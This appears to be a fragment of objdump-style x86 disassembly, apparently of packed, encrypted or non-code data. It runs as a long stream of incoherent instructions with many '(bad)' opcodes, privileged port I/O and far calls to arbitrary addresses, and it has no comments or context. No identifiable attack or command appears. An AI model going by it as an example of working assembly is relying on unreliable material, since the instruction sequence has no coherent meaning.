  42016b:	xor    BYTE PTR [ebx+0x4b],bl
  42016e:	or     BYTE PTR [ecx+0x1f790534],0xeb
  420175:	push   cs
  420176:	ins    BYTE PTR es:[edi],dx
  420177:	test   DWORD PTR [ebx],0x1f052743
  42017d:	and    bh,ch
  42017f:	dec    esp
  420180:	call   0x2a875c5
  420185:	fisub  DWORD PTR [esi+ebx*2]
  420188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420189:	mov    ecx,0xff10e41c
  42018e:	mov    edx,0xc0f3bcc0
  420193:	addr16 nop
  420195:	scas   al,BYTE PTR es:[edi]
  420196:	lahf   
  420197:	mov    al,ds:0xf2826c6e
  42019c:	es in  al,0xfe
  42019f:	mov    BYTE PTR [esi],al
  4201a1:	inc    esp
  4201a2:	mov    al,0x42
  4201a4:	stos   DWORD PTR es:[edi],eax
  4201a5:	xor    DWORD PTR [ebp+eiz*1-0x53],0xa2488f42
  4201ad:	mov    edx,0x575d55a2
  4201b2:	aad    0xd9
  4201b4:	aaa    
  4201b5:	aam    0x79
  4201b7:	inc    eax
  4201b8:	adc    cl,BYTE PTR [ecx]
  4201ba:	xor    esp,DWORD PTR [edi]
  4201bc:	ret    
  4201bd:	adc    BYTE PTR es:[ebp+0x23c7bf07],dl
  4201c4:	inc    esp
  4201c5:	inc    ecx
  4201c6:	mov    esp,0xa81cb763
  4201cb:	push   es
  4201cc:	scas   al,BYTE PTR es:[edi]
  4201cd:	push   ebp
  4201ce:	adc    eax,0x8f0924b
  4201d3:	adc    DWORD PTR ds:0x967d8a84,0x75
  4201da:	(bad)  
  4201dc:	sub    al,0xbb
  4201de:	popa   
  4201df:	inc    esp
  4201e0:	xor    esi,DWORD PTR [edx+0x3b286e2f]
  4201e6:	add    ebp,DWORD PTR [edx+0x40]
  4201e9:	mov    ecx,0xd94a1b9e
  4201ee:	sub    ebp,ebx
  4201f0:	imul   esp,DWORD PTR [edx],0x5a
  4201f3:	in     eax,0x34
  4201f5:	pop    eax
  4201f6:	sbb    edi,DWORD PTR [eax+0x2aaaf2d2]
  4201fc:	loop   0x420267
  4201fe:	xchg   ebx,eax
  4201ff:	jl     0x4201d4
  420201:	les    eax,FWORD PTR [edi-0x22]
  420204:	fbstp  TBYTE PTR [edi+0x1f01c0ef]
  42020a:	popf   
  42020b:	or     DWORD PTR [ebp+0x4e],edi
  42020e:	inc    edi
  420210:	std    
  420211:	std    
  420212:	stos   DWORD PTR es:[edi],eax
  420213:	jmp    0xf63100d3
  420218:	cld    
  420219:	int3   
  42021a:	lods   eax,DWORD PTR ds:[esi]
  42021b:	mov    ds:0xe75bf7c5,eax
  420220:	bound  eax,QWORD PTR ds:0x996357b6
  420226:	xchg   ebp,eax
  420227:	push   es
  420228:	jmp    0xa454e5a1
  42022d:	jns    0x4202a1
  42022f:	dec    ebx
  420230:	sbb    DWORD PTR [ebp-0x65ae1e38],esi
  420236:	xchg   DWORD PTR [ebp-0x7b8ee24f],edx
  42023c:	xchg   BYTE PTR [esi-0x36],dl
  42023f:	invd   
  420241:	and    al,bl
  420243:	and    DWORD PTR [esi],0x44
  420246:	xchg   ecx,eax
  420247:	or     BYTE PTR [esi+0x77f403d5],ah
  42024d:	mul    BYTE PTR [ecx-0xed073a4]
  420253:	shl    BYTE PTR [ebx-0xf],cl
  420256:	mov    edx,0x1c34727b
  42025b:	mov    bl,0x2a
  42025d:	jne    0x420283
  42025f:	ror    edx,0xdd
  420262:	test   DWORD PTR [edi+esi*1],esi
  420265:	daa    
  420266:	arpl   WORD PTR [eax+eiz*1+0x4d2f50d8],sp
  42026d:	imul   esi,DWORD PTR [edx+esi*1],0xffffffe8
  420271:	mov    ecx,0xcd76655e
  420276:	sar    BYTE PTR [ebp+0x389e9c28],0x47
  42027d:	xor    bl,BYTE PTR [esi]
  42027f:	pop    ebx
  420280:	adc    BYTE PTR [edx-0xf],ch
  420283:	push   cs
  420284:	cmp    al,0x46
  420286:	mov    bh,0x32
  420288:	outs   dx,DWORD PTR ds:[esi]
  420289:	(bad)  
  42028a:	sub    edi,eax
  42028c:	cmp    BYTE PTR [edx+eiz*8],al
  42028f:	adc    eax,0xbc2401cf
  420294:	adc    eax,DWORD PTR [ecx+0x3bb2c1f9]
  42029a:	jle    0x4202c7
  42029c:	or     DWORD PTR [edi-0x3b],ebp
  42029f:	in     al,0x70
  4202a1:	out    dx,al
  4202a2:	jne    0x42029a
  4202a4:	or     ch,BYTE PTR [ecx-0x3c40855f]
  4202aa:	fwait
  4202ab:	bound  ebp,QWORD PTR cs:[ebx]
  4202ae:	adc    DWORD PTR [edi],0x56
  4202b1:	xor    eax,DWORD PTR ds:0x27c51d68
  4202b7:	or     al,0xbd
  4202b9:	ja     0x420307
  4202bb:	(bad)  
  4202bc:	mul    DWORD PTR [edx+0x1c8aecf0]
  4202c2:	push   edi
  4202c3:	push   ebx
  4202c4:	clc    
  4202c5:	fucomip st,st(0)
  4202c7:	cld    
  4202c8:	repz inc edi
  4202ca:	(bad)  
  4202cb:	(bad)  
  4202cc:	inc    ebx
  4202cd:	dec    ebx
  4202ce:	mov    dh,BYTE PTR [esi]
  4202d0:	or     al,0x17
  4202d2:	loope  0x420348
  4202d4:	jp     0x420293
  4202d6:	adc    eax,0x2b669daa
  4202db:	rol    DWORD PTR [esp+ebx*1+0x2dfc3914],1
  4202e2:	and    BYTE PTR [edi-0x7f7e8e3b],bl
  4202e8:	inc    esi
  4202e9:	scas   al,BYTE PTR es:[edi]
  4202ea:	and    dl,ah
  4202ec:	enter  0x2423,0xa0
  4202f0:	or     edi,DWORD PTR [esi]
  4202f2:	inc    ecx
  4202f3:	xor    ecx,esp
  4202f5:	popa   
  4202f6:	popa   
  4202f7:	jge    0x420309
  4202f9:	xchg   ebx,eax
  4202fa:	rcr    BYTE PTR [esi-0x34],1
  4202fd:	and    cl,al
  4202ff:	mov    ch,0x64
  420301:	scas   al,BYTE PTR es:[edi]
  420302:	inc    ecx
  420303:	cdq    
  420304:	shl    BYTE PTR [ebp-0x4c4af546],cl
  42030a:	mov    cl,0xca
  42030c:	fisttp QWORD PTR [ebx]
  42030e:	fmul   QWORD PTR [edx]
  420310:	test   al,0x91
  420312:	frstor [esi+edx*8]
  420315:	sub    edi,DWORD PTR [edx+eax*1]
  420318:	mov    bl,0x99
  42031a:	jmp    0xf82ccc72
  42031f:	stos   DWORD PTR es:[edi],eax
  420320:	(bad)  
  420321:	mov    ch,0xab
  420323:	sbb    bl,ah
  420325:	loope  0x420361
  420327:	xor    esp,DWORD PTR [ebp-0x15d2b8be]
  42032d:	xor    eax,0x7143a6cf
  420333:	js     0x4202e3
  420335:	call   0xf793:0x75f09c58
  42033c:	cmp    eax,0xa7197273
  420341:	push   ebp
  420342:	ds cs pop esp
  420345:	not    BYTE PTR [ebx-0xae2bd54]
  42034b:	inc    ebx
  42034c:	inc    edx
  42034d:	aad    0x17
  42034f:	imul   eax,DWORD PTR [ecx+ecx*8-0x2fb68690],0x2ab03be1
  42035a:	aas    
  42035b:	loop   0x42039f
  42035d:	add    al,0xc9
  42035f:	in     eax,dx
  420360:	cmp    eax,0x6222c9d0
  420365:	push   esp
  420366:	pop    ebp
  420367:	xlat   BYTE PTR ds:[ebx]
  420368:	jg     0x4203c2
  42036a:	hlt    
  42036b:	jno    0x420369
  42036d:	stc    
  42036e:	fbld   TBYTE PTR [eax]
  420370:	mov    ?,WORD PTR [ebx]
  420372:	sar    DWORD PTR [ebp+0x3b333ab7],0x62
  420379:	xor    DWORD PTR [eax-0x2f1a6ec2],0xffffff81
  420380:	es aaa 
  420382:	and    al,ch
  420384:	mov    ds:0xd0a51b70,al
  420389:	jg     0x4203c3
  42038b:	test   eax,0x585147f7
  420390:	push   ss
  420391:	addr16 xor ah,bl
  420394:	fild   WORD PTR [edx+0xa6c076f]
  42039a:	dec    esi
  42039b:	inc    edi
  42039c:	inc    edi
  42039d:	repnz mov bl,0xa5
  4203a0:	adc    DWORD PTR [eax-0x66],eax
  4203a3:	add    eax,0x1f6cd4b7
  4203a8:	adc    eax,0x9de6a0b4
  4203ad:	xchg   ebp,eax
  4203ae:	mov    ah,0xce
  4203b0:	xchg   esp,eax
  4203b1:	cmp    DWORD PTR [eax],ebp
  4203b3:	std    
  4203b4:	leave  
  4203b5:	sti    
  4203b6:	shr    edx,1
  4203b8:	dec    edi
  4203b9:	test   eax,0x28d4cb68
  4203be:	test   al,0x50
  4203c0:	stc    
  4203c1:	fstp   DWORD PTR [ecx]
  4203c3:	ja     0x4203c6
  4203c5:	test   DWORD PTR [eax-0x54],edi
  4203c8:	xchg   ebp,eax
  4203c9:	pop    ebp
  4203ca:	in     eax,dx
  4203cb:	popa   
  4203cc:	ret    0xe544
  4203cf:	cs stos BYTE PTR es:[edi],al
  4203d1:	mov    ah,BYTE PTR [eax+0x10]
  4203d4:	or     BYTE PTR [edx+0xcf08eb7],cl
  4203da:	(bad)  
  4203dc:	out    0xc5,eax
  4203de:	(bad)  
  4203df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203e0:	or     ebp,DWORD PTR [esi+0x7fdefd30]
  4203e6:	inc    eax
  4203e7:	sbb    BYTE PTR [eax],cl
  4203e9:	repnz arpl WORD PTR [eax],di
  4203ec:	sub    eax,DWORD PTR [edi+0x15aadb22]
  4203f2:	test   al,0x64
  4203f4:	shl    edx,0xe2
  4203f7:	fld    QWORD PTR [edx+0x2]
  4203fa:	inc    esi
  4203fb:	sbb    al,0x6d
  4203fd:	jge    0x42046d
  4203ff:	mov    ch,0x7d
  420401:	rcr    DWORD PTR [ecx],1
  420403:	mov    bl,0x90
  420405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420406:	cli    
  420407:	inc    ecx
  420408:	or     eax,0xa5a061d7
  42040d:	in     eax,dx
  42040e:	retf   
  42040f:	push   ds
  420410:	xchg   edi,eax
  420411:	fimul  DWORD PTR [edi+0x77]
  420414:	test   DWORD PTR [eax],esi
  420416:	xchg   ecx,eax
  420417:	imul   ecx,DWORD PTR [eax],0xd2366e50
  42041d:	mov    cl,0x50
  42041f:	and    eax,0x6f1a3dae
  420424:	into   
  420425:	add    bh,ch
  420427:	cli    
  420428:	pop    ss
  420429:	push   esp
  42042a:	xor    al,0xbb
  42042c:	sub    bh,BYTE PTR [ecx]
  42042e:	adc    al,0xca
  420430:	fidivr DWORD PTR [ecx+0x4fe58528]
  420436:	mov    ebx,0xcccd10c0
  42043b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42043c:	jbe    0x4203fb
  42043e:	xchg   esi,eax
  42043f:	jns    0x4203e3
  420441:	sbb    al,0xa7
  420443:	push   edi
  420444:	mov    ch,0x16
  420446:	mov    ds:0xff3f653c,eax
  42044b:	xor    edi,0xfbc72fbb
  420451:	sbb    bh,ah
  420453:	cmp    ecx,ecx
  420455:	jo     0x4204b0
  420457:	sbb    dl,ah
  420459:	les    ecx,FWORD PTR [ebx+0x53b2aa2f]
  42045f:	jns    0x420464
  420461:	sub    BYTE PTR gs:0xbbba57eb,dh
  420468:	mov    dh,0x91
  42046a:	int3   
  42046b:	cmp    DWORD PTR [edx+0x116fb7fe],ebx
  420471:	add    BYTE PTR ss:[edi],bl
  420474:	or     BYTE PTR [si-0x13c4],0x29
  42047a:	mov    ch,0x6
  42047c:	ja     0x4204fc
  42047e:	pusha  
  42047f:	stos   DWORD PTR es:[edi],eax
  420480:	cmp    BYTE PTR [eax+0x4a],0x3a
  420484:	inc    esp
  420485:	push   es
  420486:	push   esp
  420487:	add    al,0xd4
  420489:	mov    ch,BYTE PTR [esi+0x4f]
  42048c:	out    0x2,eax
  42048e:	nop
  42048f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420490:	push   edx
  420491:	xor    al,BYTE PTR [esi+0x52ad241b]
  420497:	sar    BYTE PTR [esi],1
  420499:	into   
  42049a:	call   0x4b0b:0xec71abae
  4204a1:	jecxz  0x42046e
  4204a3:	xchg   edi,eax
  4204a4:	sbb    ah,BYTE PTR [ecx-0x78075edf]
  4204aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ab:	out    0xc,eax
  4204ad:	cmp    bl,BYTE PTR [ecx]
  4204af:	mov    ch,0x8c
  4204b1:	mov    ch,0x45
  4204b3:	push   edi
  4204b4:	mov    ebx,0xb1d4780f
  4204b9:	retf   0x26f1
  4204bc:	sahf   
  4204bd:	imul   esp,DWORD PTR [esi-0x23],0x28a49558
  4204c4:	inc    esp
  4204c5:	ja     0x4204e9
  4204c7:	loope  0x4204ef
  4204c9:	add    ebp,DWORD PTR [edi+0x581d19a4]
  4204cf:	inc    ecx
  4204d0:	ja     0x4204da
  4204d2:	in     eax,0xa0
  4204d4:	cmp    eax,0x23772157
  4204d9:	call   0x36d3:0xb8f2c560
  4204e0:	jl     0x420525
  4204e2:	mov    ds:0x2435d747,al
  4204e7:	push   edx
  4204e8:	cmc    
  4204e9:	and    eax,DWORD PTR [ecx]
  4204eb:	(bad)  
  4204ed:	jo     0x420484
  4204ef:	sub    DWORD PTR [ebp-0x1854c3bc],0x10158864
  4204f9:	arpl   ax,ax
  4204fb:	cmp    bh,BYTE PTR [ebp-0x39]
  4204fe:	je     0x4204b7
  420500:	pop    es
  420501:	sbb    ecx,edi
  420503:	pushf  
  420504:	sub    edi,DWORD PTR [esi-0xb]
  420507:	repz push edi
  420509:	jg     0x4204f6
  42050b:	ja     0x4204ff
  42050d:	pop    ds
  42050e:	imul   esi,DWORD PTR [edx-0x37f43512],0x8b0fa076
  420518:	pop    ebp
  420519:	mov    al,ds:0xa8021d8b
  42051e:	push   ecx
  42051f:	sub    BYTE PTR [edx],0x33
  420522:	aaa    
  420523:	sub    al,0x31
  420525:	mov    al,0x56
  420527:	adc    eax,0x8096f50b
  42052c:	add    al,0x69
  42052e:	or     DWORD PTR [eax],eax
  420530:	loop   0x4204c0
  420532:	out    0xe4,eax
  420534:	adc    al,0x54
  420536:	xor    dl,bh
  420538:	sahf   
  420539:	repnz add DWORD PTR [ebp-0x117e5c6d],esi
  420540:	pop    es
  420541:	or     al,0x40
  420543:	fisttp DWORD PTR [edx]
  420545:	push   ecx
  420546:	adc    dl,bh
  420548:	sahf   
  420549:	inc    ecx
  42054a:	adc    edx,esi
  42054c:	shr    DWORD PTR [ebx-0x4e],0x4f
  420550:	jne    0x420513
  420552:	sahf   
  420553:	add    edx,DWORD PTR [edx-0x27]
  420556:	jge    0x4205b8
  420558:	ins    DWORD PTR es:[edi],dx
  420559:	fiadd  WORD PTR [esi+0x4cca794b]
  42055f:	cmp    DWORD PTR [bp+di-0x2bb],ecx
  420564:	cmc    
  420565:	loop   0x420567
  420567:	ins    DWORD PTR es:[edi],dx
  420568:	dec    esp
  420569:	dec    edx
  42056a:	jge    0x420560
  42056c:	mov    eax,ebp
  42056e:	pop    edi
  42056f:	scas   eax,DWORD PTR es:[edi]
  420570:	mov    ah,0x6c
  420572:	test   ecx,eax
  420574:	cmp    DWORD PTR [ecx-0x1bd73e7f],esp
  42057a:	in     al,dx
  42057b:	test   BYTE PTR [edx],0xa5
  42057e:	aas    
  42057f:	gs aad 0xfe
  420582:	mov    al,ds:0xb34bfef2
  420587:	jno    0x420597
  420589:	fcomp  QWORD PTR [eax+0x7d]
  42058c:	test   eax,0x2715d0f5
  420591:	fwait
  420592:	mov    eax,0xaa00f975
  420597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420598:	cdq    
  420599:	mov    edi,0xc082a475
  42059e:	dec    esi
  42059f:	fcom   st(1)
  4205a1:	jae    0x42056c
  4205a3:	jae    0x4205fd
  4205a5:	dec    esi
  4205a6:	mov    al,ds:0x12198595
  4205ab:	or     bl,al
  4205ad:	or     ah,BYTE PTR [ebp+esi*1+0x2c0b62d]
  4205b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b5:	scas   al,BYTE PTR es:[edi]
  4205b6:	xor    ah,ch
  4205b8:	mov    edi,0xedec7c14
  4205bd:	cmp    al,0xeb
  4205bf:	add    dx,WORD PTR [ecx]
  4205c2:	mov    bh,0x6d
  4205c4:	arpl   WORD PTR [edx+0x2eef3119],di
  4205ca:	aas    
  4205cb:	popa   
  4205cc:	sbb    esi,ebx
  4205ce:	(bad)  
  4205cf:	retf   0x171e
  4205d2:	cmp    esp,eax
  4205d4:	test   al,0xe8
  4205d6:	(bad)  
  4205d7:	jmp    0x9c8bf6bf
  4205dc:	in     al,0x81
  4205de:	inc    dh
  4205e0:	jae    0x4205e6
  4205e2:	and    BYTE PTR [ecx],ah
  4205e4:	lods   al,BYTE PTR ds:[esi]
  4205e5:	cmp    ebx,ecx
  4205e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205e8:	or     BYTE PTR [ebx],bh
  4205ea:	mov    cl,0x16
  4205ec:	or     al,0xbf
  4205ee:	fadd   QWORD PTR [ebp-0x3555d23e]
  4205f4:	fs mov ah,0x95
  4205f7:	mov    ds:0x8e7ed6e3,eax
  4205fc:	mov    ds:0xb0b0963c,al
  420601:	pushf  
  420602:	je     0x4205bc
  420604:	cmp    BYTE PTR [eax],bh
  420606:	push   ds
  420607:	cld    
  420608:	xchg   DWORD PTR [ebx+0x78],ebx
  42060b:	test   BYTE PTR [ebx],ah
  42060d:	retf   0x7dc7
  420610:	pop    edx
  420611:	mov    ch,0xa3
  420613:	in     eax,dx
  420614:	outs   dx,DWORD PTR ds:[esi]
  420615:	sub    ch,BYTE PTR [edi+0x64]
  420618:	lods   eax,DWORD PTR ds:[esi]
  420619:	or     al,0x1e
  42061b:	mov    edx,DWORD PTR [edx+ebx*1]
  42061e:	xchg   DWORD PTR [ebx],esi
  420620:	push   edx
  420621:	popa   
  420622:	inc    esi
  420623:	ja     0x420656
  420625:	add    al,BYTE PTR [edx+0x71]
  420628:	cmc    
  420629:	pop    edi
  42062a:	cmp    eax,0x5169f5e6
  42062f:	push   ebx
  420630:	sub    DWORD PTR [ebx-0x2faaf538],0x3b7f7964
  42063a:	hlt    
  42063b:	xor    edi,DWORD PTR [ecx]
  42063d:	add    DWORD PTR [edx-0x344cbf44],ebp
  420643:	out    dx,al
  420644:	in     eax,dx
  420645:	out    0x94,al
  420647:	xchg   esi,eax
  420648:	pop    ebx
  420649:	or     al,0x8c
  42064b:	adc    DWORD PTR ds:0x9755160a,edi
  420651:	lods   eax,DWORD PTR ds:[esi]
  420652:	std    
  420653:	pusha  
  420654:	mov    DWORD PTR [edx+0x411437c],edx
  42065a:	fstp   TBYTE PTR [edx-0x31]
  42065d:	sahf   
  42065e:	xor    eax,DWORD PTR [edx-0x13]
  420661:	xchg   BYTE PTR [edx-0x2e289e16],al
  420667:	icebp  
  420668:	dec    esp
  420669:	ret    0x4350
  42066c:	mov    edx,0xe55c609c
  420671:	push   ds
  420672:	popf   
  420673:	mov    eax,ds:0x7bb93563
  420678:	push   esp
  420679:	mov    al,0x1b
  42067b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42067c:	push   0xffffffae
  42067e:	inc    esp
  42067f:	shl    DWORD PTR [ecx],1
  420681:	and    ch,BYTE PTR [esi-0x691d9e35]
  420687:	call   0xdc8:0x5792b336
  42068e:	int3   
  42068f:	inc    esp
  420690:	jg     0x420638
  420692:	in     al,dx
  420693:	xchg   esp,eax
  420694:	popa   
  420695:	adc    al,0x7c
  420697:	add    ch,BYTE PTR [esi]
  420699:	stos   DWORD PTR es:[edi],eax
  42069a:	call   0x7196:0x61aeea4c
  4206a1:	push   ecx
  4206a2:	pop    es
  4206a3:	retf   0x6dec
  4206a6:	call   ebp
  4206a8:	push   edx
  4206a9:	sub    eax,0x2eb6a825
  4206ae:	mov    dh,0x43
  4206b0:	stos   DWORD PTR es:[edi],eax
  4206b1:	mov    esp,0x5ed515c3
  4206b6:	push   edi
  4206b7:	cwde   
  4206b8:	jb     0x42072c
  4206ba:	dec    ebp
  4206bb:	mov    eax,ds:0x766e2daa
  4206c0:	lock inc edi
  4206c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206c3:	pop    ebp
  4206c4:	clc    
  4206c5:	and    al,0x3
  4206c7:	dec    edx
  4206c8:	add    ebp,DWORD PTR [ecx+0x757a8d42]
  4206ce:	into   
  4206cf:	scas   al,BYTE PTR es:[edi]
  4206d0:	adc    ebp,DWORD PTR [edi]
  4206d2:	popf   
  4206d3:	xlat   BYTE PTR ds:[ebx]
  4206d4:	pop    ebx
  4206d5:	sbb    ecx,edi
  4206d7:	scas   eax,DWORD PTR es:[edi]
  4206d8:	sbb    BYTE PTR [eax+0x5f],al
  4206db:	fwait
  4206dc:	jmp    0x1745336e
  4206e1:	shr    bh,0xc6
  4206e4:	stos   BYTE PTR es:[edi],al
  4206e5:	fs pushf 
  4206e7:	pop    ebx
  4206e8:	adc    ecx,eax
  4206ea:	ja     0x4206c5
  4206ec:	xlat   BYTE PTR ds:[ebx]
  4206ed:	ror    ebx,0x9c
  4206f0:	outs   dx,DWORD PTR ds:[esi]
  4206f1:	cwde   
  4206f2:	aas    
  4206f3:	mov    edi,0x61369a09
  4206f8:	popf   
  4206f9:	and    al,0x5e
  4206fb:	sahf   
  4206fc:	sub    edx,0xbf1712f9
  420702:	pop    edi
  420703:	bound  edx,QWORD PTR ds:0x7e5b26a2
  420709:	pop    ecx
  42070a:	pop    ebp
  42070b:	inc    edi
  42070c:	adc    BYTE PTR [eax+0x7c],cl
  42070f:	mov    BYTE PTR [ebx+eiz*2+0x16],bh
  420713:	and    BYTE PTR [edx+0x6e],bh
  420716:	inc    ebx
  420717:	aaa    
  420718:	imul   eax,ebx,0xc946ec4e
  42071e:	mov    edx,0xc0762a27
  420723:	inc    ebx
  420724:	call   0x71f8290a
  420729:	or     BYTE PTR [esi-0x61ec0e55],al
  42072f:	mov    dh,0xdd
  420731:	clc    
  420732:	ds mov esi,0xfce44b2a
  420738:	cmp    eax,0x1c992716
  42073d:	call   0x1b79cc3a
  420742:	icebp  
  420743:	test   BYTE PTR [eax+0xc],bh
  420746:	lea    edi,[edi+esi*1-0x31]
  42074a:	push   edi
  42074b:	sbb    esi,DWORD PTR [edx+0x2c]
  42074e:	and    al,BYTE PTR [edi]
  420750:	or     edi,DWORD PTR [ebx]
  420752:	cmc    
  420753:	push   edi
  420754:	cmp    BYTE PTR ds:0xe0f48373,ch
  42075a:	call   0xe401fc2
  42075f:	xor    bl,dl
  420761:	test   al,0xc1
  420763:	push   cs
  420764:	dec    edx
  420765:	or     bh,BYTE PTR [ecx]
  420767:	popf   
  420768:	mov    bl,0x73
  42076a:	cld    
  42076b:	sahf   
  42076c:	std    
  42076d:	cmp    BYTE PTR [ebp-0x51],ah
  420770:	call   0x128f434f
  420775:	mov    eax,ds:0xff567d7a
  42077a:	pop    edi
  42077b:	into   
  42077c:	ss (bad) 
  42077e:	fcom   QWORD PTR [eax-0x52]
  420781:	push   ds
  420782:	adc    eax,0x9acf3c6c
  420787:	add    BYTE PTR [ebx+0xc],cl
  42078a:	jne    0x4207b3
  42078c:	cmp    DWORD PTR [esi+0x67],ecx
  42078f:	jge    0x420714
  420791:	add    esi,esp
  420793:	imul   ebx,DWORD PTR [eax],0x39
  420796:	cmp    al,0x8e
  420798:	cdq    
  420799:	leave  
  42079a:	addr16 or ebx,ecx
  42079d:	push   ebp
  42079e:	shl    esi,0xed
  4207a1:	cs jne 0x42077b
  4207a4:	jle    0x420748
  4207a6:	mov    dh,0xad
  4207a8:	and    esi,DWORD PTR [ebp-0x67]
  4207ab:	sbb    eax,0x438f2a64
  4207b0:	in     al,dx
  4207b1:	xchg   esp,eax
  4207b2:	xchg   DWORD PTR [ebp+eiz*8+0x25],ebp
  4207b6:	(bad)  
  4207b7:	stos   BYTE PTR es:[edi],al
  4207b8:	pop    es
  4207b9:	sahf   
  4207ba:	cmovb  esp,DWORD PTR [edi-0x706fb553]
  4207c1:	push   eax
  4207c2:	call   ebx
  4207c4:	xor    al,BYTE PTR [edi+0x66]
  4207c7:	(bad)
  4207ca:	cmp    DWORD PTR [edi-0x1b],ebp
  4207cd:	jae    0x420815
  4207cf:	jb     0x42077c
  4207d1:	daa    
  4207d2:	xlat   BYTE PTR ds:[ebx]
  4207d3:	sbb    eax,0xffffffe4
  4207d6:	ins    DWORD PTR es:[edi],dx
  4207d7:	add    DWORD PTR ds:0x40ba46dd,edi
  4207dd:	enter  0x6e9c,0x68
  4207e1:	cmp    ebp,ecx
  4207e3:	xlat   BYTE PTR ds:[ebx]
  4207e4:	dec    esi
  4207e5:	jae    0x4207dc
  4207e7:	xchg   esi,edi
  4207e9:	sub    bh,BYTE PTR [edx]
  4207eb:	out    0x5d,al
  4207ed:	adc    bh,BYTE PTR [ebx]
  4207ef:	mov    dl,0x42
  4207f1:	enter  0xad5a,0xc7
  4207f5:	es mov ch,0xca
  4207f8:	lods   al,BYTE PTR ds:[esi]
  4207f9:	xchg   DWORD PTR [ebp-0x487c60c4],edi
  4207ff:	mov    bh,0xb0
  420801:	mov    al,ds:0xe670e07d
  420806:	xor    cl,BYTE PTR [edx]
  420808:	mov    ?,WORD PTR [ebp+0xb1f93b4]
  42080e:	repnz xchg esp,eax
  420810:	dec    edi
  420811:	scas   al,BYTE PTR es:[edi]
  420812:	add    DWORD PTR [ecx],edx
  420814:	push   es
  420815:	jl     0x42080f
  420817:	mov    ebp,0x5116069d
  42081c:	ins    BYTE PTR es:[edi],dx
  42081d:	sbb    ah,BYTE PTR [edx-0x53]
  420820:	mov    ebx,0x41a404b0
  420825:	sbb    DWORD PTR [edi-0x8],ebp
  420828:	pop    es
  420829:	scas   al,BYTE PTR es:[edi]
  42082a:	xlat   BYTE PTR ds:[ebx]
  42082b:	or     cl,BYTE PTR [ecx-0x6b]
  42082e:	data16 loope 0x42085d
  420831:	push   es
  420832:	hlt    
  420833:	cdq    
  420834:	jbe    0x4208b3
  420836:	cld    
  420837:	ret    0x1bfd
  42083a:	mov    dl,0x54
  42083c:	mov    bh,0x7
  42083e:	jae    0x4207fb
  420840:	push   0x8676e587
  420845:	loope  0x4208a4
  420847:	cmp    al,0xb6
  420849:	jmp    0x42082b
  42084b:	bound  ebp,QWORD PTR ds:0xc27f5a28
  420851:	mov    dl,0x1b
  420853:	(bad)  
  420854:	xor    eax,0x238331f5
  420859:	add    BYTE PTR [esi-0x48],bl
  42085c:	and    BYTE PTR cs:[ebp-0x69539913],al
  420863:	fnstsw WORD PTR [ebp+0x6e]
  420866:	pop    ds
  420867:	sbb    BYTE PTR [edi],bh
  420869:	sub    eax,0x6618843b
  42086e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42086f:	inc    eax
  420870:	out    0x3f,eax
  420872:	mov    ebp,DWORD PTR [ecx+0x36]
  420875:	cld    
  420876:	in     eax,dx
  420877:	adc    al,BYTE PTR [ebx-0x47]
  42087a:	out    0x36,eax
  42087c:	xlat   BYTE PTR ds:[ebx]
  42087d:	pop    ds
  42087e:	pusha  
  42087f:	pop    ebx
  420880:	cmc    
  420881:	sub    eax,0xa4dc9b20
  420886:	inc    esp
  420887:	mov    al,ds:0xc6e48e2a
  42088c:	clc    
  42088d:	mov    edi,0x62a1de18
  420892:	mov    esi,0x50eb7c89
  420897:	mov    eax,ds:0x5cf785f1
  42089c:	int    0xa2
  42089e:	pushf  
  42089f:	sub    al,ah
  4208a1:	mov    esp,0x76f18e4b
  4208a6:	jp     0x420852
  4208a8:	sub    al,0xf4
  4208aa:	jmp    0x4d785dfa
  4208af:	pop    es
  4208b0:	stos   BYTE PTR es:[edi],al
  4208b1:	das    
  4208b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b3:	pop    sp
  4208b5:	data16 loopne 0x420889
  4208b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b9:	std    
  4208ba:	mov    bl,0xb4
  4208bc:	ja     0x420921
  4208be:	test   DWORD PTR [ebp+0xd],esi
  4208c1:	in     al,0x64
  4208c3:	sbb    eax,0xa3f76ebf
  4208c8:	in     al,0x60
  4208ca:	je     0x420850
  4208cc:	mov    edi,0x3e2c9d4c
  4208d1:	sbb    BYTE PTR [eax-0x7f1150cc],bl
  4208d7:	jno    0x420881
  4208d9:	outs   dx,BYTE PTR ds:[esi]
  4208da:	je     0x42094c
  4208dc:	push   ss
  4208dd:	hlt    
  4208de:	cdq    
  4208df:	cs int 0xdf
  4208e2:	lods   al,BYTE PTR ds:[esi]
  4208e3:	add    al,0x98
  4208e5:	mov    cl,dh
  4208e7:	in     al,0x41
  4208e9:	rcl    esp,cl
  4208eb:	add    eax,0x55e3ad3d
  4208f0:	push   cs
  4208f1:	xlat   BYTE PTR ds:[ebx]
  4208f2:	pop    esi
  4208f3:	pop    edx
  4208f4:	pop    ss
  4208f5:	jg     0x4208d6
  4208f7:	test   al,0xf5
  4208f9:	aam    0x4b
  4208fb:	ret    0xbc69
  4208fe:	mov    bh,0x9f
  420900:	and    DWORD PTR [edi-0x56b6ca65],ebx
  420906:	jp     0x4208db
  420908:	dec    ebx
  420909:	sti    
  42090a:	jl     0x4208aa
  42090c:	stc    
  42090d:	jo     0x4208ae
  42090f:	sbb    DWORD PTR [ebx+0x27],ebp
  420912:	sbb    al,0x63
  420914:	mov    edi,0x50aa7f32
  420919:	mov    ah,0xe1
  42091b:	sbb    DWORD PTR [esi+edx*4],ebx
  42091e:	push   cs
  42091f:	pop    ds
  420920:	scas   al,BYTE PTR es:[edi]
  420921:	es jp  0x42095e
  420924:	push   edx
  420925:	jmp    0x4208cd
  420927:	(bad)  
  420928:	shr    DWORD PTR [esi+edi*8+0x1c],cl
  42092c:	jp     0x420989
  42092e:	inc    ebx
